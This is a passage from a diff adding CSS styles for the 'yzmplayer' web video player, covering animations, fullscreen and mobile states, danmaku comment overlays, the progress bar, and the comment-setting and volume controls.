+		-webkit-transform: translateY(1.5px) rotate(.5deg);
+		transform: translateY(1.5px) rotate(.5deg);
+	}
+
+	46% {
+		-webkit-transform: translateY(-1.5px) rotate(2.5deg);
+		transform: translateY(-1.5px) rotate(2.5deg);
+	}
+
+	48% {
+		-webkit-transform: translateY(-.5px) rotate(.5deg);
+		transform: translateY(-.5px) rotate(.5deg);
+	}
+
+	50% {
+		-webkit-transform: translateY(.5px) rotate(.5deg);
+		transform: translateY(.5px) rotate(.5deg);
+	}
+
+	52% {
+		-webkit-transform: translateY(2.5px) rotate(2.5deg);
+		transform: translateY(2.5px) rotate(2.5deg);
+	}
+
+	54% {
+		-webkit-transform: translateY(-1.5px) rotate(1.5deg);
+		transform: translateY(-1.5px) rotate(1.5deg);
+	}
+
+	56% {
+		-webkit-transform: translateY(2.5px) rotate(2.5deg);
+		transform: translateY(2.5px) rotate(2.5deg);
+	}
+
+	58% {
+		-webkit-transform: translateY(.5px) rotate(2.5deg);
+		transform: translateY(.5px) rotate(2.5deg);
+	}
+
+	60% {
+		-webkit-transform: translateY(2.5px) rotate(2.5deg);
+		transform: translateY(2.5px) rotate(2.5deg);
+	}
+
+	62% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	64% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	66% {
+		-webkit-transform: translateY(1.5px) rotate(-.5deg);
+		transform: translateY(1.5px) rotate(-.5deg);
+	}
+
+	68% {
+		-webkit-transform: translateY(-1.5px) rotate(-.5deg);
+		transform: translateY(-1.5px) rotate(-.5deg);
+	}
+
+	70% {
+		-webkit-transform: translateY(1.5px) rotate(.5deg);
+		transform: translateY(1.5px) rotate(.5deg);
+	}
+
+	72% {
+		-webkit-transform: translateY(2.5px) rotate(1.5deg);
+		transform: translateY(2.5px) rotate(1.5deg);
+	}
+
+	74% {
+		-webkit-transform: translateY(-.5px) rotate(.5deg);
+		transform: translateY(-.5px) rotate(.5deg);
+	}
+
+	76% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	78% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	80% {
+		-webkit-transform: translateY(1.5px) rotate(1.5deg);
+		transform: translateY(1.5px) rotate(1.5deg);
+	}
+
+	82% {
+		-webkit-transform: translateY(-.5px) rotate(.5deg);
+		transform: translateY(-.5px) rotate(.5deg);
+	}
+
+	84% {
+		-webkit-transform: translateY(1.5px) rotate(2.5deg);
+		transform: translateY(1.5px) rotate(2.5deg);
+	}
+
+	86% {
+		-webkit-transform: translateY(-1.5px) rotate(-1.5deg);
+		transform: translateY(-1.5px) rotate(-1.5deg);
+	}
+
+	88% {
+		-webkit-transform: translateY(-.5px) rotate(2.5deg);
+		transform: translateY(-.5px) rotate(2.5deg);
+	}
+
+	90% {
+		-webkit-transform: translateY(2.5px) rotate(-.5deg);
+		transform: translateY(2.5px) rotate(-.5deg);
+	}
+
+	92% {
+		-webkit-transform: translateY(.5px) rotate(-.5deg);
+		transform: translateY(.5px) rotate(-.5deg);
+	}
+
+	94% {
+		-webkit-transform: translateY(2.5px) rotate(.5deg);
+		transform: translateY(2.5px) rotate(.5deg);
+	}
+
+	96% {
+		-webkit-transform: translateY(-.5px) rotate(1.5deg);
+		transform: translateY(-.5px) rotate(1.5deg);
+	}
+
+	98% {
+		-webkit-transform: translateY(-1.5px) rotate(-.5deg);
+		transform: translateY(-1.5px) rotate(-.5deg);
+	}
+
+	0%,
+	to {
+		-webkit-transform: translate(0) rotate(0deg);
+		transform: translate(0) rotate(0deg);
+	}
+}
+
+.yzmplayer {
+	position: relative;
+	overflow: hidden;
+	-webkit-user-select: none;
+	-moz-user-select: none;
+	-ms-user-select: none;
+	user-select: none;
+	line-height: 1;
+}
+
+.yzmplayer * {
+	-webkit-box-sizing: content-box;
+	box-sizing: content-box;
+}
+
+.yzmplayer svg {
+	width: 100%;
+	height: 100%;
+}
+
+.yzmplayer svg circle,
+.yzmplayer svg path {
+	fill: #fff;
+}
+
+.yzmplayer:-webkit-full-screen {
+	width: 100%;
+	height: 100%;
+	background: #000;
+	position: fixed;
+	z-index: 100000;
+	left: 0;
+	top: 0;
+}
+
+.yzmplayer:-webkit-full-screen .yzmplayer-danmaku .yzmplayer-danmaku-bottom.yzmplayer-danmaku-move,
+.yzmplayer:-webkit-full-screen .yzmplayer-danmaku .yzmplayer-danmaku-top.yzmplayer-danmaku-move {
+	-webkit-animation: danmaku-center 6s linear;
+	animation: danmaku-center 6s linear;
+	-webkit-animation-play-state: inherit;
+	animation-play-state: inherit;
+}
+
+.yzmplayer:-webkit-full-screen .yzmplayer-danmaku .yzmplayer-danmaku-right.yzmplayer-danmaku-move {
+	-webkit-animation: danmaku 8s linear;
+	animation: danmaku 8s linear;
+	-webkit-animation-play-state: inherit;
+	animation-play-state: inherit;
+}
+
+.yzmplayer.yzmplayer-live .yzmplayer-bar-wrap,
+.yzmplayer.yzmplayer-live .yzmplayer-setting-loop,
+.yzmplayer.yzmplayer-live .yzmplayer-setting-speed,
+.yzmplayer.yzmplayer-live .yzmplayer-time,
+.yzmplayer.yzmplayer-no-danmaku .yzmplayer-controller .yzmplayer-icons .yzmplayer-comment,
+.yzmplayer.yzmplayer-no-danmaku .yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box .yzmplayer-setting-danmaku,
+.yzmplayer.yzmplayer-no-danmaku .yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box .yzmplayer-setting-danunlimit,
+.yzmplayer.yzmplayer-no-danmaku .yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box .yzmplayer-setting-showdan,
+.yzmplayer.yzmplayer-no-danmaku .yzmplayer-danmaku {
+	display: none;
+}
+
+.yzmplayer.yzmplayer-arrow .yzmplayer-danmaku {
+	font-size: 18px;
+}
+
+.yzmplayer.yzmplayer-arrow .yzmplayer-icon {
+	margin: 0 -3px;
+}
+
+.yzmplayer.yzmplayer-playing .yzmplayer-danmaku .yzmplayer-danmaku-move {
+	-webkit-animation-play-state: running;
+	animation-play-state: running;
+}
+
+@media (min-width:900px) {
+
+	.yzmplayer.yzmplayer-playing .yzmplayer-controller,
+	.yzmplayer.yzmplayer-playing .yzmplayer-controller-mask {
+		opacity: 0;
+	}
+
+	.yzmplayer.yzmplayer-playing:hover .yzmplayer-controller,
+	.yzmplayer.yzmplayer-playing:hover .yzmplayer-controller-mask {
+		opacity: 1;
+	}
+}
+
+.yzmplayer.yzmplayer-loading .yzmplayer-bezel .diplayer-loading-icon {
+	display: block;
+}
+
+.yzmplayer.yzmplayer-loading .yzmplayer-danmaku,
+.yzmplayer.yzmplayer-loading .yzmplayer-danmaku-move,
+.yzmplayer.yzmplayer-paused .yzmplayer-danmaku,
+.yzmplayer.yzmplayer-paused .yzmplayer-danmaku-move {
+	-webkit-animation-play-state: paused;
+	animation-play-state: paused;
+}
+
+.yzmplayer.yzmplayer-hide-controller {
+	cursor: none;
+}
+
+.yzmplayer.yzmplayer-hide-controller .yzmplayer-controller,
+.yzmplayer.yzmplayer-hide-controller .yzmplayer-controller-mask {
+	opacity: 1;
+	-webkit-transform: translateY(100%);
+	transform: translateY(100%);
+	/* display: none; */;
+}
+
+.yzmplayer.yzmplayer-show-controller .yzmplayer-controller,
+.yzmplayer.yzmplayer-show-controller .yzmplayer-controller-mask {
+	opacity: 1;
+}
+
+.yzmplayer.yzmplayer-fulled {
+	position: fixed;
+	z-index: 100000;
+	left: 0;
+	top: 0;
+	width: 100%;
+	height: 100%;
+}
+
+f .yzmplayer.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons .yzmplayer-camera-icon,
+.yzmplayer.yzmplayer-mobile .yzmplayer-controller .yzmplayer-icons .yzmplayer-volume {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-full .yzmplayer-full-in-icon {
+	position: static;
+	display: inline-block;
+}
+
+.yzmplayer.yzmplayer-mobile .yzmplayer-bar-time {
+	display: none;
+}
+
+.yzmplayer-web-fullscreen-fix {
+	position: fixed;
+	top: 0;
+	left: 0;
+	margin: 0;
+	padding: 0;
+}
+
+[data-balloon]:before {
+	display: none;
+}
+
+[data-balloon]:after {
+	padding: .3em .7em;
+	background: hsla(0, 0%, 7%, .7);
+}
+
+[data-balloon][data-balloon-pos=up]:after {
+	margin-bottom: 0;
+}
+
+.yzmplayer-bezel {
+	position: absolute;
+	left: 0;
+	right: 0;
+	top: 0;
+	bottom: 0;
+	font-size: 22px;
+	color: #fff;
+	pointer-events: none;
+}
+
+.yzmplayer-bezel .yzmplayer-bezel-icon {
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	margin: -26px 0 0 -26px;
+	height: 52px;
+	width: 52px;
+	padding: 12px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	background: rgba(0, 0, 0, .5);
+	border-radius: 50%;
+	opacity: 0;
+	pointer-events: none;
+}
+
+.yzmplayer-bezel .yzmplayer-bezel-icon.yzmplayer-bezel-transition {
+	-webkit-animation: bezel-hide .5s linear;
+	animation: bezel-hide .5s linear;
+}
+
+@-webkit-keyframes bezel-hide {
+	0% {
+		opacity: 1;
+		-webkit-transform: scale(1);
+		transform: scale(1);
+	}
+
+	to {
+		opacity: 0;
+		-webkit-transform: scale(2);
+		transform: scale(2);
+	}
+}
+
+@keyframes bezel-hide {
+	0% {
+		opacity: 1;
+		-webkit-transform: scale(1);
+		transform: scale(1);
+	}
+
+	to {
+		opacity: 0;
+		-webkit-transform: scale(2);
+		transform: scale(2);
+	}
+}
+
+.yzmplayer-bezel .yzmplayer-danloading {
+	position: absolute;
+	top: 50%;
+	margin-top: -7px;
+	width: 100%;
+	left: 0px;
+	text-align: center;
+	font-size: 14px;
+	line-height: 14px;
+	opacity: 0;
+	-webkit-animation: my-face 5s infinite ease-in-out;
+	animation: my-face 5s infinite ease-in-out;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon {
+	display: none;
+	position: absolute;
+	top: 50%;
+	left: 50%;
+	margin: -18px 0 0 -18px;
+	height: 36px;
+	width: 36px;
+	pointer-events: none;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-hide {
+	display: none;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot {
+	-webkit-animation: diplayer-loading-dot-fade .8s ease infinite;
+	animation: diplayer-loading-dot-fade .8s ease infinite;
+	opacity: 0;
+	-webkit-transform-origin: 4px 4px;
+	transform-origin: 4px 4px;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot.diplayer-loading-dot-7 {
+	-webkit-animation-delay: .7s;
+	animation-delay: .7s;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot.diplayer-loading-dot-6 {
+	-webkit-animation-delay: .6s;
+	animation-delay: .6s;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot.diplayer-loading-dot-5 {
+	-webkit-animation-delay: .5s;
+	animation-delay: .5s;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot.diplayer-loading-dot-4 {
+	-webkit-animation-delay: .4s;
+	animation-delay: .4s;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot.diplayer-loading-dot-3 {
+	-webkit-animation-delay: .3s;
+	animation-delay: .3s;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot.diplayer-loading-dot-2 {
+	-webkit-animation-delay: .2s;
+	animation-delay: .2s;
+}
+
+.yzmplayer-bezel .diplayer-loading-icon .diplayer-loading-dot.diplayer-loading-dot-1 {
+	-webkit-animation-delay: .1s;
+	animation-delay: .1s;
+}
+
+@-webkit-keyframes diplayer-loading-dot-fade {
+	0% {
+		opacity: .7;
+		-webkit-transform: scale(1.2);
+		transform: scale(1.2);
+	}
+
+	50% {
+		opacity: .25;
+		-webkit-transform: scale(.9);
+		transform: scale(.9);
+	}
+
+	to {
+		opacity: .25;
+		-webkit-transform: scale(.85);
+		transform: scale(.85);
+	}
+}
+
+@keyframes diplayer-loading-dot-fade {
+	0% {
+		opacity: .7;
+		-webkit-transform: scale(1.2);
+		transform: scale(1.2);
+	}
+
+	50% {
+		opacity: .25;
+		-webkit-transform: scale(.9);
+		transform: scale(.9);
+	}
+
+	to {
+		opacity: .25;
+		-webkit-transform: scale(.85);
+		transform: scale(.85);
+	}
+}
+
+.yzmplayer-controller-mask {
+	background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAADGCAYAAAAT+OqFAAAAdklEQVQoz42QQQ7AIAgEF/T/D+kbq/RWAlnQyyazA4aoAB4FsBSA/bFjuF1EOL7VbrIrBuusmrt4ZZORfb6ehbWdnRHEIiITaEUKa5EJqUakRSaEYBJSCY2dEstQY7AuxahwXFrvZmWl2rh4JZ07z9dLtesfNj5q0FU3A5ObbwAAAABJRU5ErkJggg==) repeat-x bottom;
+	height: 98px;
+	width: 100%;
+}
+
+.yzmplayer-controller,
+.yzmplayer-controller-mask {
+	position: absolute;
+	bottom: 0;
+	-webkit-transition: all .3s ease;
+	transition: all .3s ease;
+}
+
+.yzmplayer-controller {
+	left: 0;
+	right: 0;
+	height: 2.3rem;
+	padding: 0 20px;
+	-webkit-user-select: none;
+	-moz-user-select: none;
+	-ms-user-select: none;
+	user-select: none;
+	display: block;
+	/*animation: fastr-20 5.5s;*/
+	/*-webkit-animation: fastr-21 0.5s;*/
+	/*-moz-animation: fastr-20 0.5s;*/;
+}
+
+.yzmplayer-controller.yzmplayer-controller-comment .yzmplayer-icons {
+	/* display:none */;
+}
+
+.yzmplayer-controller.yzmplayer-controller-comment .yzmplayer-icons.yzmplayer-comment-box {
+	display: block !important;
+}
+
+.yzmplayer-danmu-block {
+	position: relative;
+}
+
+.yzmplayer-setting-block {
+	position: relative;
+	z-index: 10;
+	display: inline-block;
+	height: 100%;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap {
+	padding: 5px 0;
+	cursor: pointer;
+	position: absolute;
+	bottom: 45px;
+	width: calc(100% - 40px);
+	height: 3px;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar-preview {
+	position: absolute;
+	background: #fff;
+	pointer-events: none;
+	display: none;
+	background-size: auto 100%;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar-preview-canvas {
+	position: absolute;
+	width: 100%;
+	height: 100%;
+	z-index: 1;
+	pointer-events: none;
+}
+
+.yzmplayer-bar-time {
+	position: absolute;
+	left: 0;
+	top: -25px;
+	width: 44px;
+	height: 60px;
+	border-radius: 4px;
+	/* padding:5px 7px; */
+	background-color: rgba(0, 0, 0, .62);
+	color: #fff;
+	font-size: 9pt;
+	text-align: center;
+	opacity: 1;
+	transition: opacity .1s ease-in-out;
+	word-wrap: normal;
+	word-break: normal;
+	z-index: 2;
+	pointer-events: none;
+	background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAaAgMAAADK7ZTuAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAJUExURUdwTACh1gpuj9P9BL4AAAABdFJOUwBA5thmAAAAJElEQVQI12NgIAawhjYAScYwMCcCTCowkAMUECZATIOYjB0AAO64A1PzvczoAAAAAElFTkSuQmCC) no-repeat center;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar-time.hidden {
+	opacity: 0;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar {
+	position: relative;
+	height: 2px;
+	width: 100%;
+	background: hsla(0, 0%, 100%, .2);
+	cursor: pointer;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar {
+	height: 4px;
+	margin-top: -1px;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar .yzmplayer-loaded {
+	background: hsla(0, 0%, 100%, .4);
+	/* -webkit-transition:all .5s ease; */
+	/* transition:all .5s ease */;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar .yzmplayer-loaded,
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar .yzmplayer-played {
+	position: absolute;
+	left: 0;
+	top: 0;
+	bottom: 0;
+	height: 2px;
+	will-change: width;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar .yzmplayer-loaded,
+.yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar .yzmplayer-played {
+	height: 4px;
+	margin-top: 0px;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap .yzmplayer-bar .yzmplayer-played .yzmplayer-thumb {
+	position: absolute;
+	top: 0;
+	right: 0px;
+	margin-top: -8px;
+	margin-right: -10px;
+	height: 18px;
+	width: 18px;
+	border-radius: 50%;
+	cursor: pointer;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	-webkit-transform: scale(0);
+	transform: scale(0);
+	background: unset !important;
+}
+
+.yzmplayer-controller .yzmplayer-bar-wrap:hover .yzmplayer-bar .yzmplayer-played .yzmplayer-thumb {
+	-webkit-transform: scale(1);
+	transform: scale(1);
+	margin-top: -10px;
+}
+
+.yzmplayer-controller .yzmplayer-icons {
+	height: 50px;
+	position: absolute;
+	bottom: 0px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box {
+	display: none;
+	position: absolute;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	z-index: 2;
+	height: 42px;
+	bottom: 0;
+	left: 20px;
+	right: 20px;
+	color: #fff;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-icon {
+	padding: 7px;
+	height: 38px;
+	margin-left: 0;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-icon {
+	position: absolute;
+	left: 0;
+	top: 0;
+	/* padding: 5px 5px; */
+	position: relative;
+	float: left;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-send-icon {
+	position: absolute;
+	right: 0;
+	top: 0;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box {
+	position: absolute;
+	background: rgba(28, 28, 28, .9);
+	bottom: 18px;
+	left: 0;
+	-webkit-box-shadow: 0 0 25px rgba(0, 0, 0, .3);
+	box-shadow: 0 0 25px rgba(0, 0, 0, .3);
+	border-radius: 4px;
+	padding: 10px 10px 16px;
+	font-size: 14px;
+	width: 172px;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	-webkit-transform: scale(0);
+	transform: scale(0);
+	z-index: 71;
+	background: rgba(21, 21, 21, .9);
+	border-radius: 2px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box.yzmplayer-comment-setting-open {
+	-webkit-transform: scale(1);
+	transform: scale(1);
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box input[type=radio] {
+	display: none;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box label {
+	cursor: pointer;
+	background: #757575 !important;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-title {
+	font-size: 13px;
+	color: #fff;
+	line-height: 30px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-type {
+	font-size: 0;
+	margin-top: 30px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-type .yzmplayer-comment-setting-title {
+	margin-bottom: 6px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-type label:nth-child(2) span {
+	border-radius: 4px 0 0 4px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-type label:nth-child(4) span {
+	border-radius: 0 4px 4px 0;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-type span {
+	width: 33%;
+	padding: 4px 6px;
+	line-height: 16px;
+	display: inline-block;
+	font-size: 12px;
+	color: #fff;
+	margin-right: 0px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	text-align: center;
+	cursor: pointer;
+	background: rgba(255, 255, 255, 0.2);
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-type input:checked+span {
+	background: #00a0d5;
+	color: #fff;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-font {
+	font-size: 0;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-font .yzmplayer-comment-setting-title {
+	margin-bottom: 6px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-font label:nth-child(2) span {
+	border-radius: 4px 0 0 4px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-font label:nth-child(5) span {
+	border-radius: 0 4px 4px 0;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-font span {
+	width: 25%;
+	padding: 4px 6px;
+	line-height: 16px;
+	display: inline-block;
+	font-size: 12px;
+	color: #fff;
+	margin-right: 0px;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	text-align: center;
+	cursor: pointer;
+	background: rgba(255, 255, 255, 0.2);
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-font input:checked+span {
+	background: #00a0d5;
+	color: #fff;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-color {
+	font-size: 0;
+	padding-top: 5px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-color label {
+	font-size: 0;
+	padding: 4px;
+	display: inline-block;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-color span {
+	width: 20px;
+	height: 20px;
+	display: inline-block;
+	border-radius: 50%;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	cursor: pointer;
+	width: 16px;
+	height: 16px;
+	border: 1px solid rgba(0, 0, 0, .3);
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	border-radius: 2px;
+	/* margin-right: 6px; */
+	/* margin-bottom: 4px; */
+	cursor: pointer;
+	display: inline-block;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-color input:checked+span {
+	-webkit-box-shadow: 0 0 1px 1px #fff;
+	box-shadow: 0 0 1px 1px #fff;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-setting-box .yzmplayer-comment-setting-color span:hover {
+	-webkit-animation: my-face 5s infinite ease-in-out;
+	animation: my-face 5s infinite ease-in-out;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-input {
+	outline: none;
+	border: none;
+	padding: 8px 31px;
+	font-size: 14px;
+	line-height: 18px;
+	text-align: center;
+	border-radius: 4px;
+	background: none;
+	margin: 0;
+	height: 100%;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	width: 100%;
+	color: #fff;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-input::-webkit-input-placeholder {
+	color: #fff;
+	opacity: .8;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-input:-ms-input-placeholder,
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-input::-ms-input-placeholder {
+	color: #fff;
+	opacity: .8;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-comment-box .yzmplayer-comment-input::placeholder {
+	color: #fff;
+	opacity: .8;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-icons-left .yzmplayer-icon {
+	padding: 7px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-icons-right {
+	right: 20px;
+}
+
+.yzmplayer-controller .yzmplayer-icons.yzmplayer-icons-right .yzmplayer-icon {
+	padding: 8px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-live-badge,
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-time {
+	line-height: 40px;
+	color: #eee;
+	text-shadow: 0 0 2px rgba(0, 0, 0, .5);
+	vertical-align: middle;
+	font-size: 13px;
+	cursor: default;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-live-dot {
+	display: inline-block;
+	width: 6px;
+	height: 6px;
+	vertical-align: 4%;
+	margin-right: 5px;
+	content: "";
+	border-radius: 6px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon {
+	width: 40px;
+	height: 100%;
+	border: none;
+	background-color: transparent;
+	outline: none;
+	cursor: pointer;
+	vertical-align: middle;
+	-webkit-box-sizing: border-box;
+	box-sizing: border-box;
+	display: inline-block;
+	/*margin-left: -10px;*/;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon .yzmplayer-icon-content {
+	-webkit-transition: all .2s ease-in-out;
+	transition: all .2s ease-in-out;
+	opacity: 1;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon:hover .yzmplayer-icon-content {
+	opacity: .8;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon.yzmplayer-quality-icon {
+	color: #fff;
+	width: auto;
+	line-height: 22px;
+	font-size: 14px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon.yzmplayer-comment-icon {
+	padding: 10px 9px 9px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon.yzmplayer-setting-icon {
+	padding-top: 8.5px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-icon.yzmplayer-volume-icon {
+	width: 40px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume {
+	position: relative;
+	display: inline-block;
+	cursor: pointer;
+	height: 100%;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume:hover .yzmplayer-volume-bar-wrap .yzmplayer-volume-bar {
+	width: 45px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume:hover .yzmplayer-volume-bar-wrap .yzmplayer-volume-bar .yzmplayer-volume-bar-inner .yzmplayer-thumb {
+	-webkit-transform: scale(1);
+	transform: scale(1);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume.yzmplayer-volume-active .yzmplayer-volume-bar-wrap .yzmplayer-volume-bar {
+	width: 45px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume.yzmplayer-volume-active .yzmplayer-volume-bar-wrap .yzmplayer-volume-bar .yzmplayer-volume-bar-inner .yzmplayer-thumb {
+	-webkit-transform: scale(1);
+	transform: scale(1);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume .yzmplayer-volume-bar-wrap {
+	display: inline-block;
+	margin: 0 10px 0 0px;
+	vertical-align: middle;
+	height: 100%;
+	border-radius: 21px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume .yzmplayer-volume-bar-wrap .yzmplayer-volume-bar {
+	position: relative;
+	top: 24px;
+	width: 0;
+	height: 3px;
+	background: #aaa;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	border-radius: 21px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume .yzmplayer-volume-bar-wrap .yzmplayer-volume-bar .yzmplayer-volume-bar-inner {
+	position: absolute;
+	bottom: 0;
+	left: 0;
+	height: 100%;
+	-webkit-transition: all .1s ease;
+	transition: all .1s ease;
+	will-change: width;
+	border-radius: 16px;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-volume .yzmplayer-volume-bar-wrap .yzmplayer-volume-bar .yzmplayer-volume-bar-inner .yzmplayer-thumb {
+	position: absolute;
+	top: 0;
+	right: 5px;
+	margin-top: -3px;
+	margin-right: -10px;
+	height: 9px;
+	width: 9px;
+	border-radius: 50%;
+	cursor: pointer;
+	-webkit-transition: all .3s ease-in-out;
+	transition: all .3s ease-in-out;
+	-webkit-transform: scale(0);
+	transform: scale(0);
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting,
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-subtitle-btn {
+	display: inline-block;
+	height: 100%;
+}
+
+.yzmplayer-controller .yzmplayer-icons .yzmplayer-setting .yzmplayer-setting-box {
